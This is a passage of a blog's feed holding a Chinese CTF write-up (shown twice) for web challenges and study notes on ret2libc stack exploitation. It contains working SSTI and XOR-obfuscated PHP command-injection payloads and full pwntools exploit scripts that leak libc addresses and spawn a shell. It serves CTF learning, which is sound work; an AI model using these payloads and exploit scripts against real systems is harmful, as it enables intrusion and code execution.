      <link href="/2020/10/14/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/"/>
      <url>/2020/10/14/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<p>第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</p><h1 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h1><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>扫一下目录，有个<a href="http://www.rar，解压审计一下代码，找到关键文件key.php" target="_blank" rel="noopener">www.rar，解压审计一下代码，找到关键文件key.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XJNU</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/system|exec|eval|shell_exec|passthru|phpinfo/i"</span> , $_GET[<span class="string">'f'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"do not attack me"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/system|exec|eval|shell_exec|passthru|phpinfo/i"</span> , $_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"do not attack me"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/XJNU|flag/i"</span> , $_GET[<span class="string">'f'</span>]) || preg_match(<span class="string">"/XJNU|flag/i"</span> , $_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"no way!&lt;br&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$new = call_user_func_array($_GET[<span class="string">'f'</span>],[<span class="string">""</span>, $_GET[<span class="string">'b'</span>]]);</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'c'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>回调函数的rce，不过因为参数c过滤不严格，导致可以通过getheader来rce。</p><p>先var_dump(scand(“/“))找到flag文件，再用readfile读就可以了。</p><p><img src="wp-1.png" alt=""></p><h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>随便输入账户登录进去，fuzz一下，在每日报告的第三个参数存在ssti。过滤了些关键字，用globals来找就行。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status_1&#x3D;&amp;status_2&#x3D;&amp;status_3&#x3D;&#123;&#123;url_for.__globals__.os.popen(&#39;cat &#x2F;flag2333_canufindit&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="wp-2.png" alt=""></p><h1 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h1><h3 id="simplecalculator"><a href="#simplecalculator" class="headerlink" title="simplecalculator"></a>simplecalculator</h3><p>一个简单的命令执行,Ban一些符号与字符函数，可以通过重载函数的方法来调用。因此我们利用异或拼出GET然后调用system来rec。</p><p><img src="C:%5CUsers%5Clexs%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200920162855771.png" alt="image-20200920162855771"></p><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;http:&#x2F;&#x2F;172.1.21.13&#x2F;flag.php?search&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>`</p><p><img src="C:%5CUsers%5Clexs%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200920163003542.png" alt="image-20200920163003542"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</title>
      <link href="/2020/09/22/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/"/>
      <url>/2020/09/22/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<p> 一场言难尽比赛,孤军奋战,尽力就好…..</p><a id="more"></a><h1 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h1><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>扫一下目录，有个<a href="http://www.rar，解压审计一下代码，找到关键文件key.php" target="_blank" rel="noopener">www.rar，解压审计一下代码，找到关键文件key.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XJNU</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/system|exec|eval|shell_exec|passthru|phpinfo/i"</span> , $_GET[<span class="string">'f'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"do not attack me"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/system|exec|eval|shell_exec|passthru|phpinfo/i"</span> , $_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"do not attack me"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/XJNU|flag/i"</span> , $_GET[<span class="string">'f'</span>]) || preg_match(<span class="string">"/XJNU|flag/i"</span> , $_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"no way!&lt;br&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$new = call_user_func_array($_GET[<span class="string">'f'</span>],[<span class="string">""</span>, $_GET[<span class="string">'b'</span>]]);</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'c'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>回调函数的rce，不过因为参数c过滤不严格，导致可以通过getheader来rce。</p><p>先var_dump(scand(“/“))找到flag文件，再用readfile读就可以了。</p><p><img src="wp-1.png" alt=""></p><h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>随便输入账户登录进去，fuzz一下，在每日报告的第三个参数存在ssti。过滤了些关键字，用globals来找就行。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status_1&#x3D;&amp;status_2&#x3D;&amp;status_3&#x3D;&#123;&#123;url_for.__globals__.os.popen(&#39;cat &#x2F;flag2333_canufindit&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="wp-2.png" alt=""></p><h1 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h1><h3 id="simplecalculator"><a href="#simplecalculator" class="headerlink" title="simplecalculator"></a>simplecalculator</h3><p>一个简单的命令执行,Ban一些符号与字符函数，可以通过重载函数的方法来调用。因此我们利用异或拼出GET然后调用system来rec。</p><p><img src="image-20200920162855771.png" alt="image-20200920162855771"></p><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;http:&#x2F;&#x2F;172.1.21.13&#x2F;flag.php?search&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>`</p><p><img src="image-20200920163003542.png" alt="image-20200920163003542"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习pwn小记(2)</title>
      <link href="/2020/09/13/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(2)/"/>
      <url>/2020/09/13/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(2)/</url>
      
        <content type="html"><![CDATA[<p>在研究ret2libc时,耗费几天时间去理解学习。感觉在了解ret2libc技术的同时更多的还是学习到一些调试与编写的技术以及解决了我的一些疑惑，故写文以记之。</p><a id="more"></a><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><p>在做这一道题时,checksec下</p><p><img src="image-20200914161838576.png" alt="image-20200914161838576"></p><p>发现还是开了NX，打开ida反序列化。发现有gets函数猜测有栈溢出，又发现有system函数但调用时不是system(‘/bin/sh’).但在ida中找到了’/bin/sh’.又由于调用了，猜测plt表里有system。于是思路就清晰了，用plt里system来调用‘/bin/sh’。于是得到exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">p=process(<span class="string">'./ret2libc1'</span>)</span><br><span class="line">e=ELF(<span class="string">'./ret2libc1'</span>)</span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">112</span>+p32(e.plt[<span class="string">'system'</span>])+p32(<span class="number">0</span>)+p32(<span class="number">0x08048720</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>在写这个exp时，套用了之前大佬的脚本但一直纳闷为什么在payload要system后加4个字符（‘p32(0)’）？</p><p>在学习某大佬的<a href="https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" target="_blank" rel="noopener">/return2libc学习笔记</a>后，豁然开朗。其实我们payload的作用，大概如下图所示：</p><p><img src="image-20200914223959660.png" alt="image-20200914223959660"></p><p>在溢出数据后，使用libc库中system函数的地址覆盖掉原本的返回地址（这样原函数返回的时候会转而调用system函数），然后跟着是返回地址、参数。所以我们的system后加<strong>4个字符（‘p32(0)’）在图中的‘Filler’的位置指代是返回地址</strong>。</p><p>那么跟的问题也来了，为什么Filler’的位置(‘p(0)’)指代是返回地址？为什么参数跟在返回地址后面？</p><p>正常情况下，我们是通过call指令进行函数调用的，因此在进入到system函数之前，call指令已经通过push EIP将其返回地址push到栈帧中了，所以在正常情况下ret指令pop到EIP的数据就是之前call指令push到栈帧的数据，也就是说两者是成对的。但是在我们的利用漏洞攻击中，直接通过覆盖EIP地址跳转到了system函数，而并没有经过call调用，也即是没有push EIP的操作，但是system函数却照常进行了ret指令的pop EIP操作。此时的ESP指向了Filler，所以根据栈的‘后进先出’的原则在栈顶（ESP）的Filler会被pop出保存在EIP中。而EIP作用是保存的是返回地址，所以Filler就成了返回地址。</p><p><img src="image-20200915113940247.png" alt="image-20200915113940247"></p><p>同时我们在进行漏洞攻击中，与正常函数相比就只少了‘进入到system函数之前，call指令已经通过push EIP将其返回地址push到栈帧中’这一步骤，因此参数还是正常的跟在返回地址后面。</p><h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><p>刚做这道题看着ctf-wiki的讲解,有的蒙.因为在ret2libc1的基础上没有’/bin/sh’，然后看着上面给的exp也，没怎么看懂。自己照着<a href="https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" target="_blank" rel="noopener">return2libc学习笔记</a>的思路走的（但也还是不少的弯子）。</p><p><img src="image-20200915201444197.png" alt="image-20200915201444197"></p><p>想调用system（’/bin/sh’）,但是想要一个地方储‘/bin/sh‘于是找到buf可以读写执行。于是想用个方法写’/bin/sh‘到buf。再调用在范围地址那调用EIP。开始短路了,想着用scanf然后发现自己tcl不懂参数，于是看了下大佬的解析用了get函数。于是大体思路就成：溢出调用get将’/bin/sh‘写入bss中的buf，再将返回地址指向system，并将buf传入system。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">112</span>+p32(e.plt[<span class="string">'gets'</span>])+p32(e.plt[<span class="string">'system'</span>])+p32(<span class="number">0x0804A080</span>)+p32(<span class="number">0x0804A080</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>做到这里时，我产生几个疑问：</p><p>1）gets为什么能将数据写入buf？</p><p>gets函数的作用是将接收到的数据写入参数中。我们将buf地址作为参数传入gets函数，gets函数将数据写入buf地址对应空间。</p><p>2）system为什么不跟上返回地址再加参数?</p><p>在通过第一次ret2libc调用到system时，system是正常调用的。所以在调用时不需更上返回地址。可以看到进入system后esp指向的就是第一个参数。</p><p><img src="image-20200915204940834.png" alt="image-20200915204940834"></p><p>3）ctf-wiki中的payload的写法是什么？</p><p>payload的写法是溢出数据+get地址+edx地址+duf地址+system地址+返回地址+buf地址</p><p>按个人理解改写那种思路exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">112</span>+p32(e.plt[<span class="string">'gets'</span>])+p32(<span class="number">0x0804843d</span>)+p32(<span class="number">0x0804A080</span>)+p32(e.plt[<span class="string">'system'</span>])+p32(<span class="number">0</span>)+p32(<span class="number">0x0804A080</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>EDX处命令相当于： pop edx；ret；</p><p>而：</p><blockquote><p>CPU在执行call指令时需要进行两步操作:</p><p>1.将当前的IP(也就是函数返回地址)入栈，即：push EIP;</p><p>2.跳转，即： jmp dword ptr 内存单元地址。</p><p>CPU在执行ret指令时只需要恢复IP寄存器即可，因此ret指令相当于pop EIP</p></blockquote><p>所以system地址会pop入EIP运行。</p><p>经过gdb，在ebx返回时，esp指向的是system。ret则是将system pop入EIP。证明这个是可行的</p><p><img src="image-20200915220654816.png" alt="image-20200915220654816"></p><h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><p>ret2libc2 的基础上，再次将 system 函数的地址去掉。我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。程序保护如下:</p><p><img src="image-20200915231136645.png" alt="image-20200915231136645"></p><p>nx打开导致我们无法直接写入shell执行。</p><p>在这里有个知识点吧：</p><p>system函数属于libc，而libc.so动态链接库中的函数之间的相对偏移是固定的，也就是说要找基地址，则有公式：<strong>A真实地址-A的偏移地址 = B真实地址-B的偏移地址 = 基地址</strong>。</p><p>由于libc的延迟绑定机制，我们需要泄漏已经执行过的函数的地址，已经执行过的话就会在got表生存下来，有了真实的地址的信息。</p><p><img src="image-20200915232459322.png" alt="image-20200915232459322"></p><p>发现程序之前调用了puts与printf函数，因此我们可以：</p><p>puts真实地址-puts的偏移地址  = 基地址= system真实地址-system的偏移地址</p><p>但是再仔细找文件，发现没给libc文件信息。</p><p>这里又用到一个知识点：</p><p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，<strong>最低的 12 位并不会发生改变</strong>。如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">sh = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]<span class="comment">#我们需要用put输出在服务器端的实际地址</span></span><br><span class="line">puts_got = ret2libc3.got[<span class="string">'puts'</span>]<span class="comment">#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象</span></span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>]<span class="comment">#返回地址被覆盖为main函数的地址，再次执行main，以求再次溢出</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak puts_got addr and return to main again"</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">112</span>+ p32(puts_plt)+p32(main)+p32( puts_got)</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get the related addr"</span></span><br><span class="line">puts_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])<span class="comment">#交互时接受返回的在libc中的真实地址，由于是32位的文件，recv(4)是指只接收四个字节的信息，因为泄露的地址信息只存在于前四个字节，u32是指解包unpack，将一块数据解包成四个字节</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)<span class="comment">#通过偏移计算出基地址</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,"b *puts")</span></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)<span class="comment">#通过基地址，算出system在libc中的真实地址</span></span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)<span class="comment">#通过基地址，算出/bin/sh在libc中的真实地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">104</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>然后这个我踩过两个坑:</p><p>1)got地址及libc中的真实地址之间的关系.</p><p>got表里存放了libc函数的真实地址,而got地址是指的got的某一个空间的地址.这某一个空间里存放着我们要的真实地址.</p><p>2)第二次溢出的数据为104个字符.一次运行main时栈大小有108,而第二次栈大小只有有100多.</p><p>第一次:</p><p><img src="image-20200916092210173.png" alt="image-20200916092210173"></p><p>第二次:</p><p><img src="image-20200916092338372.png" alt="image-20200916092338372"></p><p>然后看下dl在wiki的留言:</p><blockquote><p>发现start函数有一句and esp, 0FFFFFFF0h进行了堆栈平衡，可以自己写个demo试一下，在and语句之前，esp的值是0xffffade8，而经过and之后，esp的值就变为了0xffffade0。所以问题就出在 _start函数的and语句，要是直接返回main函数就相当于少了一个and操作，esp的位置也就多了8。（栈的内存增长相反，即栈空间少了8）</p></blockquote><p>像是因为_start函数做了堆栈平衡,然我们第二次调用main没有做.所以esp多了8.</p><p><img src="image-20200916101954834.png" alt="image-20200916101954834"></p><p>于是改exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">sh = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = ret2libc3.got[<span class="string">'puts'</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">'_start'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak puts_got addr and return to main again"</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">112</span>+ p32(puts_plt)+p32(main)+p32( puts_got)</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get the related addr"</span></span><br><span class="line">puts_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_addr:'</span>+hex(puts_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_got:'</span>+hex(puts_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_plt:'</span>+hex(puts_plt)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">104</span>+<span class="string">'abcdefgh'</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>gdb 第一次执行get后栈:</p><p><img src="image-20200916102207673.png" alt="image-20200916102207673"></p><p>gdb 第二次执行get后栈:</p><p><img src="image-20200916103121220.png" alt="image-20200916103121220"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</a></p><p><a href="https://www.jianshu.com/p/4928e726a43f" target="_blank" rel="noopener">https://www.jianshu.com/p/4928e726a43f</a></p><p><a href="https://blog.csdn.net/qq_41918771/article/details/90665950" target="_blank" rel="noopener">https://blog.csdn.net/qq_41918771/article/details/90665950</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
